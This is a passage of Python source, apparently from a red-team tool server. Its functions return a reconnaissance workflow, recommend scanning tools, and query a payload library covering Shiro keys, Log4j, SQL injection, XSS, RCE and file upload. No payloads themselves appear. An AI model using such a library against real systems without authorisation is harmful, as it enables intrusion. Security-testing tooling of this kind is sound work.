    workflow = CompleteReconToolkit.get_recon_workflow()
    
    return {
        "success": True,
        "target": target,
        "workflow": workflow,
        "phases": 10,
        "description": "完整的红队侦察流程，从资产发现到漏洞利用"
    }


def _recon_tools_recommend(args: Dict) -> Dict:
    """🛠️ 侦察工具链推荐"""
    from core.complete_recon_toolkit import CompleteReconToolkit
    
    scenario = args.get("scenario", "full")
    
    tools_map = {
        "subdomain": CompleteReconToolkit.RECON_TOOLS["subdomain_enum"],
        "port_scan": CompleteReconToolkit.RECON_TOOLS["port_scan"],
        "fingerprint": CompleteReconToolkit.RECON_TOOLS["fingerprint"],
        "directory": CompleteReconToolkit.RECON_TOOLS["directory_scan"],
        "vuln_scan": CompleteReconToolkit.RECON_TOOLS["vuln_scan"],
        "full": CompleteReconToolkit.RECON_TOOLS
    }
    
    recommended_tools = tools_map.get(scenario, {})
    
    return {
        "success": True,
        "scenario": scenario,
        "recommended_tools": recommended_tools,
        "tool_count": len(recommended_tools) if isinstance(recommended_tools, dict) else sum(len(v) for v in recommended_tools.values())
    }


def _query_payload_library(args: Dict) -> Dict:
    """📚 Payload库查询"""
    from core.mega_payload_library import MegaPayloadLibrary
    
    payload_type = args.get("payload_type", "all")
    category = args.get("category", "")
    
    payload_map = {
        "shiro": {"payloads": MegaPayloadLibrary.SHIRO_KEYS, "count": len(MegaPayloadLibrary.SHIRO_KEYS)},
        "log4j": {"payloads": MegaPayloadLibrary.LOG4J_PAYLOADS, "count": len(MegaPayloadLibrary.LOG4J_PAYLOADS)},
        "sqli": {"payloads": MegaPayloadLibrary.SQLI_PAYLOADS, "count": sum(len(v) for v in MegaPayloadLibrary.SQLI_PAYLOADS.values())},
        "xss": {"payloads": MegaPayloadLibrary.XSS_PAYLOADS, "count": sum(len(v) for v in MegaPayloadLibrary.XSS_PAYLOADS.values())},
        "rce": {"payloads": MegaPayloadLibrary.RCE_PAYLOADS, "count": sum(len(v) for v in MegaPayloadLibrary.RCE_PAYLOADS.values())},
        "upload": {"payloads": MegaPayloadLibrary.FILE_UPLOAD, "count": sum(len(v) for v in MegaPayloadLibrary.FILE_UPLOAD.values())}
    }
    
    if payload_type == "all":
        stats = MegaPayloadLibrary.get_all_payloads()
        return {
            "success": True,
            "statistics": stats,
            "total": sum(stats.values()),
            "details": MegaPayloadLibrary.get_stats()
        }
    
    result = payload_map.get(payload_type, {})
    
    return {
        "success": True,
        "payload_type": payload_type,
        "payloads": result.get("payloads", []),
        "count": result.get("count", 0)
    }
